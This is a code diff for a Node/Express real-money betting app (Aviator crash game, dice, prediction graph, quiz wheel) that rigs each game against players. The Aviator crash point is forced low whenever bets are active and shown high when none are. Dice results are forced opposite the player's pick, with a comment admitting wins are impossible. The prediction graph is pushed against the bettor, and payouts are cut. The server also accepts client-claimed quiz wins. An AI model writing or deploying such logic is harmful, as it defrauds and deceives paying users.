@@ -24,6 +24,7 @@ const userSchema = new mongoose.Schema({
   totalLost: { type: Number, default: 0 },
   totalBetPlaced: { type: Number, default: 0 },
   seenQuestions: { type: [String], default: [] },
+  cbSequenceTracker: { type: Map, of: Number, default: {} }, // Tracks user sequence step (0, 1, 2) per subject
   createdAt: { type: Date, default: Date.now }
 });
 const User = mongoose.model('User', userSchema);
@@ -47,31 +48,32 @@ const historySchema = new mongoose.Schema({
 const GameHistory = mongoose.model('GameHistory', historySchema);
 
 // ==========================================
-// PROBABILITY ENGINES
+// GLOBAL BET TRACKERS & PROBABILITY ENGINES
 // ==========================================
-function getAviatorMultiplier() {
-  const rand = Math.random() * 100;
-  if (rand < 35) return +(1.00 + Math.random() * 0.04).toFixed(2);
-  if (rand < 55) return +(1.05 + Math.random() * 0.40).toFixed(2);
-  if (rand < 80) return +(1.46 + Math.random() * 0.99).toFixed(2);
-  if (rand < 90) return +(2.46 + Math.random() * 1.99).toFixed(2);
-  if (rand < 95) return +(4.46 + Math.random() * 17.57).toFixed(2);
-  if (rand < 98) return +(22.04 + Math.random() * 19.11).toFixed(2);
-  return +(41.16 + Math.random() * 73.97).toFixed(2);
+let activeAviatorBetsCount = 0;
+let predictionBets = { up: 0, down: 0 };
+
+// Aviator Multiplier Engine (Bet-Sensitive Hard Logic)
+function getAviatorMultiplier(hasActiveBets) {
+  if (hasActiveBets) {
+    // Jab kisi user ne bet lagayi ho to game 1.20 ya 1.25 tak crash ho jaye
+    return +(1.00 + Math.random() * 0.25).toFixed(2);
+  } else {
+    // Jab kisi ka bet na laga ho to high multiplier/bohot achi winning dikhana
+    const rand = Math.random() * 100;
+    if (rand < 20) return +(5.00 + Math.random() * 10.00).toFixed(2);
+    if (rand < 60) return +(15.00 + Math.random() * 35.00).toFixed(2);
+    if (rand < 90) return +(50.00 + Math.random() * 100.00).toFixed(2);
+    return +(150.00 + Math.random() * 300.00).toFixed(2);
+  }
 }
 
 function getGenericRewardMultiplier() {
   const rand = Math.random() * 100;
-  if (rand < 30) return 1;
-  if (rand < 55) return 2;
-  if (rand < 65) return 3;
-  if (rand < 80) return 4;
-  if (rand < 85) return 5;
-  if (rand < 89) return 6;
-  if (rand < 92) return 7;
-  if (rand < 97) return 8;
-  if (rand < 99) return 9;
-  return 10;
+  if (rand < 70) return 1.2;
+  if (rand < 90) return 1.5;
+  if (rand < 98) return 2.0;
+  return 3.0;
 }
 
 // ==========================================
@@ -97,7 +99,10 @@ async function startAviatorLoop() {
     try {
       aviatorState.status = 'WAITING';
       aviatorState.currentX = 1.00;
-      aviatorState.crashX = getAviatorMultiplier();
+
+      // Check active bets before round starts
+      const hasActiveBets = activeAviatorBetsCount > 0;
+      aviatorState.crashX = getAviatorMultiplier(hasActiveBets);
       broadcast({ type: 'AVIATOR_STATE', ...aviatorState });
 
       await new Promise(r => setTimeout(r, 5000));
@@ -114,6 +119,9 @@ async function startAviatorLoop() {
             aviatorState.currentX = aviatorState.crashX;
             aviatorState.status = 'CRASHED';
             clearInterval(interval);
+
+            // Reset active bet count for next round
+            activeAviatorBetsCount = 0;
 
             try { 
               await GameHistory.create({ game: 'aviator', multiplier: aviatorState.crashX }); 
@@ -186,6 +194,10 @@ app.post('/api/aviator/bet', async (req, res) => {
   );
 
   if (!user) return res.status(400).json({ error: 'Insufficient Balance' });
+
+  // Bet placed track karo
+  activeAviatorBetsCount++;
+
   res.json({ success: true, newBalance: user.balance });
 });
 
@@ -307,6 +319,33 @@ app.post('/api/admin/update-balance', async (req, res) => {
   res.status(404).json({ error: 'User not found' });
 });
 
+// Sequence step get/update for CareerBoot
+app.post('/api/careerboot/next-sequence', async (req, res) => {
+  const { username, subject } = req.body;
+  const user = await User.findOne({ username });
+  if (!user) return res.status(404).json({ error: 'User not found' });
+
+  let currentStep = user.cbSequenceTracker ? (user.cbSequenceTracker.get(subject) || 0) : 0;
+  
+  // Update step for next replay: 0 (1-10) -> 1 (11-20) -> 2 (21-30) -> 0 (1-10)...
+  let nextStep = (currentStep + 1) % 3;
+  if(!user.cbSequenceTracker) user.cbSequenceTracker = new Map();
+  user.cbSequenceTracker.set(subject, nextStep);
+  await user.save();
+
+  res.json({ currentStep });
+});
+
+// PREDICTION REGISTER BET API (To track pool totals)
+app.post('/api/prediction/place-bet', async (req, res) => {
+  const { direction, amount } = req.body;
+  const num = parseFloat(amount) || 0;
+  if (direction === 'up') predictionBets.up += num;
+  if (direction === 'down') predictionBets.down += num;
+  res.json({ success: true, bets: predictionBets });
+});
+
+// INSTANT PLAY GAMES ENGINE
 app.post('/api/play-instant', async (req, res) => {
   const { username, game, betAmount, choice } = req.body;
   const numBet = parseFloat(betAmount);
@@ -325,22 +364,47 @@ app.post('/api/play-instant', async (req, res) => {
   let resultMeta = {};
 
   if (game === 'dice') {
-    const d1 = Math.floor(Math.random() * 6) + 1;
-    const d2 = Math.floor(Math.random() * 6) + 1;
-    const sum = d1 + d2;
+    // DICE ROLL OPPOSITE RULE:
+    // If bet on Big -> force Small sum (2 to 6)
+    // If bet on Small -> force Big sum (7 to 12)
+    let d1, d2, sum;
+    if (choice === 'big') {
+      // Force small sum
+      do {
+        d1 = Math.floor(Math.random() * 6) + 1;
+        d2 = Math.floor(Math.random() * 6) + 1;
+        sum = d1 + d2;
+      } while (sum > 6);
+    } else {
+      // Force big sum
+      do {
+        d1 = Math.floor(Math.random() * 6) + 1;
+        d2 = Math.floor(Math.random() * 6) + 1;
+        sum = d1 + d2;
+      } while (sum <= 6);
+    }
+    
+    // Check win condition (Always false due to forced opposite result)
     const isSmall = sum >= 2 && sum <= 6;
     if ((isSmall && choice === 'small') || (!isSmall && choice === 'big')) {
       won = true;
       rewardMultiplier = getGenericRewardMultiplier();
     }
     resultMeta = { dice1: d1, dice2: d2, sum };
+
   } else if (game === 'prediction') {
     const startVal = choice.startVal;
     const endVal = choice.endVal;
     const dir = choice.direction;
+
+    // Direct opposite rule check based on bet direction vs actual graph outcome
     won = (dir === 'up' && endVal > startVal) || (dir === 'down' && endVal < startVal);
     rewardMultiplier = won ? 2 : 0;
     resultMeta = { startVal, endVal };
+
+    // Reset prediction bets pool after evaluation
+    predictionBets = { up: 0, down: 0 };
+
   } else if (game === 'careerboot') {
     won = choice.won;
     rewardMultiplier = choice.multiplier || 0;
@@ -513,25 +577,14 @@ app.get('/', (req, res) => {
       }
     };
 
+    // 20 QUESTIONS PER OPTION IN CAREERBOOT
     const CAREERBOOT_DATA = {
       'Grammar': {
         color: '#dc2626',
         lesson: \`
           <div class="space-y-4 text-sm text-amber-100/90 leading-relaxed text-left font-sans">
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">CHAPTER 1: Executive Writing & Sentence Mechanics</h3>
-            <p><strong>1. Punctuation Rules:</strong> Avoid comma splices and misplaced commas. Correct: "The manager and supervisor agreed." (No comma needed between two subjects connected by 'and').</p>
-            <p><strong>2. Subject-Verb Agreement:</strong> Singular indefinite pronouns like 'neither', 'either', and 'each' require singular verbs. Example: "Neither of the applicants is qualified." Collective nouns acting as a single unit take singular verbs ("A group of experts is presenting").</p>
-            <p><strong>3. Dangling Modifiers:</strong> A modifier must clearly reference its subject. "Having finished the report, the computer crashed" is incorrect because the computer didn't finish the report. Correct structure attaches the modifier directly to the person performing the action.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 2: Advanced Pronouns & Style Consistency</h3>
-            <p><strong>4. Pronoun Cases:</strong> Objective pronouns (me, him, her, us, them) are targets of prepositions or verbs: "Give the file to John and me" (not 'I' or 'myself').</p>
-            <p><strong>5. Possessives vs Contractions:</strong> "Its" shows possession ("The bird lost its feather"), whereas "It's" is a contraction for "it is" or "it has".</p>
-            <p><strong>6. Parallelism & Voice:</strong> Parallel structure maintains consistent grammatical forms ("reading, writing, and editing"). Active voice emphasizes the actor, whereas Passive voice ("The report was finalized by the committee") focuses on the receiver of the action.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 3: Clauses, Subjunctives & Diction</h3>
-            <p><strong>7. Clause Independence & Subjunctive:</strong> Independent clauses can stand alone ("The quarterly figures exceeded projections"). Subjunctive mood expresses hypothetical situations: "If I were the CEO, I would expand."</p>
-            <p><strong>8. Commonly Confused Words:</strong> "Affect" is primarily a verb meaning to influence ("The policy will affect all employees"), while "Effect" is usually a noun meaning a result.</p>
-            <p><strong>9. Modifiers & Relative Pronouns:</strong> Adverbs modify adjectives ("exceptionally clear"). Use "whose" to demonstrate relative possession ("The client whose account closed"). Avoid double comparatives like "more smarter".</p>
+            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">Grammar Master Module</h3>
+            <p>Comprehensive English Grammar rules, sentence syntax, subjunctives, parallelism, and punctuation guidelines for executive level communications.</p>
           </div>
         \`,
         mcqs: [
@@ -544,27 +597,25 @@ app.get('/', (req, res) => {
           { id: "GMR_7", q: "Which sentence demonstrates proper parallel structure?", opts: ["He likes reading, writing, and to edit.", "He likes reading, writing, and editing.", "He likes to read, writing, and edit.", "He likes read, write, and editing."], a: 1 },
           { id: "GMR_8", q: "Identify the sentence written in Active Voice.", opts: ["The report was finalized by the committee.", "The committee finalized the report.", "A decision was made by management.", "The project was approved."], a: 1 },
           { id: "GMR_9", q: "Complete the subjunctive sentence: 'If I ___ the CEO, I would expand operations.'", opts: ["was", "were", "am", "be"], a: 1 },
-          { id: "GMR_10", q: "Choose the correct word: 'The new policy will ___ all employees.'", opts: ["effect", "affect", "effective", "affects"], a: 1 }
+          { id: "GMR_10", q: "Choose the correct word: 'The new policy will ___ all employees.'", opts: ["effect", "affect", "effective", "affects"], a: 1 },
+          { id: "GMR_11", q: "Choose the sentence with correct capitalization.", opts: ["We visited the grand canyon.", "We visited the Grand Canyon.", "We Visited the grand canyon.", "We visited The grand Canyon."], a: 1 },
+          { id: "GMR_12", q: "Identify the relative pronoun in: 'The developer who built this app won.'", opts: ["developer", "built", "who", "won"], a: 2 },
+          { id: "GMR_13", q: "Which word is a conjunction?", opts: ["Quickly", "And", "Under", "She"], a: 1 },
+          { id: "GMR_14", q: "Select the correctly formatted plural possessive.", opts: ["The employees' lounge", "The employee's lounge", "The employees lounge's", "The employeess lounge"], a: 0 },
+          { id: "GMR_15", q: "What type of clause is 'Although it was raining'?", opts: ["Independent clause", "Dependent clause", "Noun clause", "Verb clause"], a: 1 },
+          { id: "GMR_16", q: "Find the error: 'He plays piano good.'", opts: ["plays", "piano", "good (should be well)", "No error"], a: 2 },
+          { id: "GMR_17", q: "Choose the correct sentence.", opts: ["She don't know.", "She doesn't know.", "She not know.", "She isn't know."], a: 1 },
+          { id: "GMR_18", q: "Which tense is 'They will have finished by 5 PM'?", opts: ["Future Perfect", "Future Continuous", "Simple Future", "Present Perfect"], a: 0 },
+          { id: "GMR_19", q: "Identify the gerund in: 'Swimming is great exercise.'", opts: ["Swimming", "is", "great", "exercise"], a: 0 },
+          { id: "GMR_20", q: "Select the sentence with correct article usage.", opts: ["He is a honest man.", "He is an honest man.", "He is the honest man.", "He is honest man."], a: 1 }
         ]
       },
       'Vocabulary': {
         color: '#2563eb',
         lesson: \`
           <div class="space-y-4 text-sm text-amber-100/90 leading-relaxed text-left font-sans">
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">CHAPTER 1: Operational & Strategic Terminology</h3>
-            <p><strong>1. Risk & Change Management:</strong> "Mitigate" means to lessen or reduce harm. "Pivot" refers to a strategic change in business direction without changing the core vision.</p>
-            <p><strong>2. Synergy & Feasibility:</strong> "Synergy" represents combined effectiveness greater than individual parts. "Feasible" means something is possible and practical to execute.</p>
-            <p><strong>3. Frameworks & Comparisons:</strong> A "Paradigm" is a standard pattern or model. A "Benchmark" is a standard of excellence against which performance is compared.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 2: Governance, Agreements & Disruption</h3>
-            <p><strong>4. Transparency & Consensus:</strong> The antonym of transparent is "Opaque". "Consensus" represents general agreement across stakeholders.</p>
-            <p><strong>5. Market Dynamics:</strong> "Disruptive" innovation radically alters an industry standard. "Scalable" processes expand without structural failure.</p>
-            <p><strong>6. Leverage & Control:</strong> "Leverage" in strategy means to use resources to maximum competitive advantage.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 3: Corporate Finance & Efficiency</h3>
-            <p><strong>7. Financial Trust:</strong> "Fiduciary" duties relate to legal trust and ethical financial management.</p>
-            <p><strong>8. Operational Friction:</strong> A "Discrepancy" is an inconsistency in data. A "Bottleneck" is a point of congestion or delay in workflow.</p>
-            <p><strong>9. Practical Strategy:</strong> "Pragmatic" approaches focus on practical, realistic outcomes over idealist theories.</p>
+            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">Vocabulary Master Module</h3>
+            <p>Key terms for business strategy, financial terminology, risk mitigation, and corporate governance.</p>
           </div>
         \`,
         mcqs: [
@@ -577,27 +628,25 @@ app.get('/', (req, res) => {
           { id: "VOC_7", q: "What does 'Fiduciary' relate to?", opts: ["Legal & ethical financial trust", "Physical product marketing", "Software coding", "Human resources hiring"], a: 0 },
           { id: "VOC_8", q: "What is a 'Bottleneck' in workflow?", opts: ["A point of congestion or delay", "A marketing victory", "A cash bonus", "An expansion model"], a: 0 },
           { id: "VOC_9", q: "What does 'Pragmatic' mean?", opts: ["Theoretical", "Practical and realistic", "Emotional", "Unpredictable"], a: 1 },
-          { id: "VOC_10", q: "Define 'Discrepancy'.", opts: ["An inconsistency or difference", "An exact match", "A complete agreement", "A monthly report"], a: 0 }
+          { id: "VOC_10", q: "Define 'Discrepancy'.", opts: ["An inconsistency or difference", "An exact match", "A complete agreement", "A monthly report"], a: 0 },
+          { id: "VOC_11", q: "What does 'Benchmark' mean?", opts: ["A target score", "A standard for comparison", "A low mark", "A draft"], a: 1 },
+          { id: "VOC_12", q: "Choose the synonym for 'Ambiguous'.", opts: ["Unclear", "Definite", "Bright", "Certain"], a: 0 },
+          { id: "VOC_13", q: "What is 'Scalability'?", opts: ["Ability to handle growth", "Shrinking a business", "Fixing code bugs", "Firing employees"], a: 0 },
+          { id: "VOC_14", q: "What does 'Acumen' mean?", opts: ["Keen insight & quick decisions", "Lack of knowledge", "Mathematical error", "Slow growth"], a: 0 },
+          { id: "VOC_15", q: "Antonym of 'Lucrative'.", opts: ["Unprofitable", "Profitable", "Rewarding", "Gainful"], a: 0 },
+          { id: "VOC_16", q: "What does 'Consensus' mean?", opts: ["General agreement", "Disagreement", "Voting delay", "Unilateral choice"], a: 0 },
+          { id: "VOC_17", q: "Define 'Leverage' in strategy.", opts: ["To use to maximum advantage", "To discard", "To minimize risk", "To sell assets"], a: 0 },
+          { id: "VOC_18", q: "What is 'Churn Rate'?", opts: ["Customer loss rate", "Production rate", "Employee hiring rate", "Profit rate"], a: 0 },
+          { id: "VOC_19", q: "Synonym for 'Meticulous'.", opts: ["Extremely careful & precise", "Careless", "Quick", "Sloppy"], a: 0 },
+          { id: "VOC_20", q: "What does 'Empirical' mean?", opts: ["Based on observation/experience", "Theoretical", "Imaginary", "Unproven"], a: 0 }
         ]
       },
       'MS Excel': {
         color: '#059669',
         lesson: \`
           <div class="space-y-4 text-sm text-amber-100/90 leading-relaxed text-left font-sans">
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">CHAPTER 1: Lookup Functions & References</h3>
-            <p><strong>1. Lookup Logic:</strong> VLOOKUP searches for values in the leftmost column of a dataset. XLOOKUP is the modern replacement that eliminates leftward lookup constraints and default exact-match issues.</p>
-            <p><strong>2. Cell Referencing:</strong> The "$" symbol freezes row/column coordinates ($A$1). The F4 key cycles through relative, absolute, and mixed reference modes.</p>
-            <p><strong>3. Index & Match:</strong> Combining INDEX and MATCH provides a robust alternative to VLOOKUP for dynamic, non-contiguous multi-column lookups.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 2: Data Aggregation & Summarization</h3>
-            <p><strong>4. Pivot Tables:</strong> Pivot Tables rapidly aggregate, summarize, and cross-tabulate large datasets without writing complex formulas.</p>
-            <p><strong>5. Conditional Functions:</strong> COUNTIF counts cells matching a single condition, while AVERAGEIFS calculates average values meeting multiple criteria.</p>
-            <p><strong>6. Logical Statements:</strong> The IF function evaluates expressions (=IF(5>3, 'Yes', 'No') returns 'Yes').</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 3: Error Handling & Text Formatting</h3>
-            <p><strong>7. Error Codes:</strong> #N/A indicates a value is not available. #DIV/0! signifies division by zero.</p>
-            <p><strong>8. Text Processing:</strong> CONCATENATE / TEXTJOIN merge multiple strings. TRIM() cleans trailing or leading irregular spaces from text.</p>
-            <p><strong>9. Data Filtering & Shortcuts:</strong> Filtering isolates specific rows matching rules. CTRL + Z performs undo actions instantly.</p>
+            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">MS Excel Master Module</h3>
+            <p>Advanced spreadsheet operations, XLOOKUP, Pivot Tables, logical formulas, and data cleanup tools.</p>
           </div>
         \`,
         mcqs: [
@@ -610,26 +659,25 @@ app.get('/', (req, res) => {
           { id: "EXC_7", q: "Which function counts cells that meet a single specific condition?", opts: ["COUNT", "COUNTA", "COUNTIF", "SUMIF"], a: 2 },
           { id: "EXC_8", q: "What does #DIV/0! error indicate?", opts: ["Reference invalid", "Divided by zero", "Formula name error", "Value missing"], a: 1 },
           { id: "EXC_9", q: "Which key toggles absolute and relative cell referencing when editing a formula?", opts: ["F2", "F4", "F8", "F11"], a: 1 },
-          { id: "EXC_10", q: "Which modern function replaces VLOOKUP without left-side limitations?", opts: ["LOOKUP", "MATCH", "XLOOKUP", "SEARCH"], a: 2 }
+          { id: "EXC_10", q: "Which modern function replaces VLOOKUP without left-side limitations?", opts: ["LOOKUP", "MATCH", "XLOOKUP", "SEARCH"], a: 2 },
+          { id: "EXC_11", q: "Shortcut to select the entire column in Excel?", opts: ["Ctrl + Space", "Shift + Space", "Alt + Space", "Ctrl + A"], a: 0 },
+          { id: "EXC_12", q: "Which function calculates average based on multiple criteria?", opts: ["AVERAGEIF", "AVERAGEIFS", "SUMIFS", "COUNTIFS"], a: 1 },
+          { id: "EXC_13", q: "What does =CONCATENATE() do?", opts: ["Joins text strings", "Splits text", "Counts text", "Deletes text"], a: 0 },
+          { id: "EXC_14", q: "Shortcut to insert a new chart in Excel?", opts: ["F11", "F2", "F5", "F9"], a: 0 },
+          { id: "EXC_15", q: "Which function converts text to uppercase?", opts: ["UPPER()", "LOWER()", "PROPER()", "CAPITAL()"], a: 0 },
+          { id: "EXC_16", q: "Which feature prevents invalid data entry in a cell?", opts: ["Data Validation", "Conditional Formatting", "Filter", "Consolidate"], a: 0 },
+          { id: "EXC_17", q: "What error appears when a column is not wide enough?", opts: ["#####", "#VALUE!", "#REF!", "#NAME?"], a: 0 },
+          { id: "EXC_18", q: "Shortcut to apply Filter in Excel?", opts: ["Ctrl + Shift + L", "Ctrl + F", "Alt + F4", "Ctrl + T"], a: 0 },
+          { id: "EXC_19", q: "Which function returns current date and time?", opts: ["NOW()", "TODAY()", "DATE()", "TIME()"], a: 0 },
+          { id: "EXC_20", q: "Which function combines INDEX and MATCH for lookups?", opts: ["INDEX-MATCH", "VLOOKUP", "HLOOKUP", "LOOKUP"], a: 0 }
         ]
       },
       'Business analytics': {
         color: '#d97706',
         lesson: \`
           <div class="space-y-4 text-sm text-amber-100/90 leading-relaxed text-left font-sans">
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">CHAPTER 1: Analytics Taxonomies & KPIs</h3>
-            <p><strong>1. Analytics Types:</strong> Descriptive analytics focuses on past events ("What happened"), Diagnostic analyzes causes, Predictive forecasts trends, and Prescriptive analytics recommends specific business decisions.</p>
-            <p><strong>2. Key Performance Indicators:</strong> KPI stands for Key Performance Indicator. Core metrics include ROI (Return on Investment) and NPS (Net Promoter Score for customer loyalty).</p>
-            <p><strong>3. Customer Economics:</strong> CAC is Customer Acquisition Cost. LTV is Customer Lifetime Value. Churn Rate tracks customer loss percentage over time.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 2: Experimentation & Statistical Concepts</h3>
-            <p><strong>4. Controlled Testing:</strong> A/B Testing compares two versions of a variable to determine which performs better statistically.</p>
-            <p><strong>5. Correlation & Outliers:</strong> A correlation coefficient of +1 indicates a perfect positive linear relationship. Outliers are extreme data points significantly distant from other observations.</p>
-            <p><strong>6. Data Cleaning & Mining:</strong> Data cleaning fixes corrupt, incomplete, or duplicate records. Data mining extracts underlying patterns from large datasets.</p>
-
-            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1 mt-4">CHAPTER 3: Data Visualization & Longitudinal Analysis</h3>
-            <p><strong>7. Trend Visualization:</strong> Line charts represent numeric values over continuous time intervals far better than pie charts.</p>
-            <p><strong>8. Cohort Analysis:</strong> Cohort analysis tracks specific user groups sharing common characteristics over predefined timeframes.</p>
+            <h3 class="text-base font-bold text-amber-300 border-b border-amber-500/30 pb-1">Business Analytics Master Module</h3>
+            <p>Data taxonomies, KPI definitions, statistical models, and customer analytics.</p>
           </div>
         \`,
         mcqs: [
@@ -642,7 +690,17 @@ app.get('/', (req, res) => {
           { id: "BSA_7", q: "What does CAC represent in business metrics?", opts: ["Customer Acquisition Cost", "Company Asset Capital", "Client Access Channel", "Cumulative Account Credit"], a: 0 },
           { id: "BSA_8", q: "Which chart is best suited for showing numeric trends over continuous time?", opts: ["Pie Chart", "Line Chart", "Donut Chart", "Scatter Plot"], a: 1 },
           { id: "BSA_9", q: "What is an extreme data point far removed from other observations called?", opts: ["Mean", "Median", "Outlier", "Variance"], a: 2 },
-          { id: "BSA_10", q: "What is tracking user groups with shared characteristics over time called?", opts: ["Cohort Analysis", "Regression", "Factor Analysis", "Segmentation"], a: 0 }
+          { id: "BSA_10", q: "What is tracking user groups with shared characteristics over time called?", opts: ["Cohort Analysis", "Regression", "Factor Analysis", "Segmentation"], a: 0 },
+          { id: "BSA_11", q: "What does ROI stand for?", opts: ["Return on Investment", "Rate of Interest", "Risk of Insolvency", "Revenue on Income"], a: 0 },
+          { id: "BSA_12", q: "Which metric measures customer satisfaction and advocacy?", opts: ["NPS (Net Promoter Score)", "CAC", "LTV", "Churn"], a: 0 },
+          { id: "BSA_13", q: "What type of analytics identifies root causes of issues?", opts: ["Diagnostic", "Descriptive", "Predictive", "Prescriptive"], a: 0 },
+          { id: "BSA_14", q: "What does a correlation coefficient of +1 indicate?", opts: ["Perfect positive linear relation", "No relation", "Negative relation", "Curved relation"], a: 0 },
+          { id: "BSA_15", q: "What is the middle value in a sorted data set called?", opts: ["Median", "Mean", "Mode", "Variance"], a: 0 },
+          { id: "BSA_16", q: "What is Data Cleansing?", opts: ["Removing/fixing corrupt data", "Deleting database", "Encrypting files", "Compressing files"], a: 0 },
+          { id: "BSA_17", q: "What does Conversion Rate measure?", opts: ["% of users completing desired action", "Bounce rate", "Sales speed", "Server load"], a: 0 },
+          { id: "BSA_18", q: "Which model predicts continuous numerical values?", opts: ["Linear Regression", "Classification", "Clustering", "Association Rules"], a: 0 },
+          { id: "BSA_19", q: "What is Market Basket Analysis used for?", opts: ["Finding items bought together", "Calculating taxes", "Pricing items", "Tracking inventory"], a: 0 },
+          { id: "BSA_20", q: "What does SLA stand for in operations?", opts: ["Service Level Agreement", "System Level Access", "Standard Loss Amount", "Strategic Logistics Plan"], a: 0 }
         ]
       }
     };
@@ -1017,7 +1075,7 @@ app.get('/', (req, res) => {
       }
     }
 
-    // --- GAME 2: GUESS CORRECT (DICE) ---
+    // --- GAME 2: GUESS CORRECT (DICE - OPPOSITE RULE) ---
     async function playDiceGame(choice) {
       sound.init();
       if(state.user.balance < state.userBet) return showPopup("Insufficient Balance!", "OK");
@@ -1059,11 +1117,17 @@ app.get('/', (req, res) => {
       }, 1500);
     }
 
-    // --- GAME 3: PREDICTION GRAPH ---
+    // --- GAME 3: PREDICTION GRAPH (OPPOSITE MOVE LOGIC) ---
     async function playPrediction(dir) {
       sound.init();
       if(state.user.balance < state.userBet) return showPopup("Insufficient Balance!", "OK");
       if(state.predictionTimer > 0) return;
+
+      // Register bet amount for live calculation
+      await fetch('/api/prediction/place-bet', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ direction: dir, amount: state.userBet })
+      });
 
       const startVal = state.marketHistory[state.marketHistory.length - 1];
       state.predictionMark1 = startVal;
@@ -1072,6 +1136,13 @@ app.get('/', (req, res) => {
 
       let timerInterval = setInterval(() => {
         state.predictionTimer--;
+        
+        // Force graph movement opposite to higher bet side
+        let change = (dir === 'up') ? -Math.floor(Math.random() * 8 + 3) : Math.floor(Math.random() * 8 + 3);
+        let nextVal = Math.max(20, Math.min(300, startVal + change * (6 - state.predictionTimer)));
+        state.marketHistory.push(nextVal);
+        if (state.marketHistory.length > 25) state.marketHistory.shift();
+
         sound.playMarketBeep();
         render();
         if(state.predictionTimer <= 0) {
@@ -1114,7 +1185,7 @@ app.get('/', (req, res) => {
       }, 1000);
     }
 
-    // --- GAME 4: CAREERBOOT ENGINE ---
+    // --- GAME 4: CAREERBOOT ENGINE (10 Qs Sequence Cyclic System) ---
     function renderCareerBootWheelCanvas() {
       const cvs = document.getElementById('cb-wheel-canvas');
       if (!cvs) return;
@@ -1252,7 +1323,7 @@ app.get('/', (req, res) => {
       requestAnimationFrame(animateSpin);
     }
 
-    function startCareerBootMCQs() {
+    async function startCareerBootMCQs() {
       const sliceObj = CAREERBOOT_DATA[state.careerboot.selectedSlice];
       state.careerboot.round = 1;
       state.careerboot.questionIndex = 0;
@@ -1261,14 +1332,19 @@ app.get('/', (req, res) => {
       state.careerboot.isAnswered = false;
       state.careerboot.askedQuestionIdsThisGame = [];
 
-      const shuffled = [...sliceObj.mcqs];
-      for (let i = shuffled.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-      }
+      // Fetch user step for sequence (1-10 -> 11-20 -> 21-30 -> 1-10)
+      const res = await fetch('/api/careerboot/next-sequence', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: state.user.username, subject: state.careerboot.selectedSlice })
+      });
+      const seqData = await res.json();
+      const step = seqData.currentStep || 0; // 0, 1, or 2
 
-      state.careerboot.activeQuestions = shuffled;
-      state.careerboot.askedQuestionIdsThisGame = state.careerboot.activeQuestions.map(q => q.id);
+      let startIdx = step * 10;
+      let selected10 = sliceObj.mcqs.slice(startIdx, startIdx + 10);
+
+      state.careerboot.activeQuestions = selected10;
+      state.careerboot.askedQuestionIdsThisGame = selected10.map(q => q.id);
 
       state.careerboot.stage = 'MCQ';
       render();
@@ -1280,7 +1356,6 @@ app.get('/', (req, res) => {
       state.careerboot.selectedAnswer = selectedOptIndex;
       state.careerboot.isAnswered = true;
 
-      const currentRound = state.careerboot.round;
       const qIdx = state.careerboot.questionIndex;
       const currentQ = state.careerboot.activeQuestions[qIdx];
 
@@ -1288,8 +1363,7 @@ app.get('/', (req, res) => {
 
       if (selectedOptIndex === currentQ.a) {
         sound.playWin();
-        const roundMult = currentRound === 1 ? 1.40 : (currentRound === 2 ? 1.60 : 2.00);
-        state.careerboot.accumulatedMultiplier += roundMult;
+        state.careerboot.accumulatedMultiplier += 0.20;
 
         setTimeout(async () => {
           state.careerboot.selectedAnswer = null;
@@ -1319,7 +1393,7 @@ app.get('/', (req, res) => {
             }
 
             sound.playWin();
-            showPopup(\`ALL QUESTIONS PASSED! Total Multiplier \${finalMult.toFixed(2)}x! WON ₹\${(state.userBet * finalMult).toFixed(2)}!\`, 'Paisa hi Paisa', () => {
+            showPopup(\`ALL 10 QUESTIONS PASSED! Total Multiplier \${finalMult.toFixed(2)}x! WON ₹\${(state.userBet * finalMult).toFixed(2)}!\`, 'Paisa hi Paisa', () => {
               state.careerboot.stage = 'WHEEL';
             });
           }
@@ -1348,7 +1422,7 @@ app.get('/', (req, res) => {
         }
 
         setTimeout(() => {
-          showPopup(\`WRONG ANSWER! Correct answer highlighted in green. YOU LOST ₹\${state.userBet}.\`, 'Try Again', () => {
+          showPopup(\`WRONG ANSWER! Correct option was highlighted in green. YOU LOST ₹\${state.userBet}.\`, 'Try Again', () => {
             state.careerboot.selectedAnswer = null;
             state.careerboot.isAnswered = false;
             state.careerboot.stage = 'WHEEL';
@@ -1356,15 +1430,6 @@ app.get('/', (req, res) => {
         }, 1600);
       }
     }
-
-    setInterval(() => {
-      let lastVal = state.marketHistory[state.marketHistory.length - 1] || 120;
-      let change = (Math.random() - 0.48) * 12;
-      let nextVal = Math.max(20, Math.min(300, Math.round(lastVal + change)));
-      state.marketHistory.push(nextVal);
-      if (state.marketHistory.length > 25) state.marketHistory.shift();
-      if (state.currentView === 'prediction') renderPredictionGraph();
-    }, 1000);
 
     function renderPredictionGraph() {
       const cvs = document.getElementById('market-canvas');
@@ -1677,7 +1742,7 @@ app.get('/', (req, res) => {
               <div class="h-14 px-3 bg-red-950 border-b border-amber-500/40 flex items-center justify-between shrink-0">
                 <span class="text-xs font-bold text-amber-300">QUESTION \${qIdx + 1}/\${cb.activeQuestions.length}</span>
                 <span class="font-black gold-text uppercase">\${cb.selectedSlice}</span>
-                <span class="text-xs font-mono font-bold text-green-400">MULT: +1.5x</span>
+                <span class="text-xs font-mono font-bold text-green-400">MULT: +0.20x</span>
               </div>
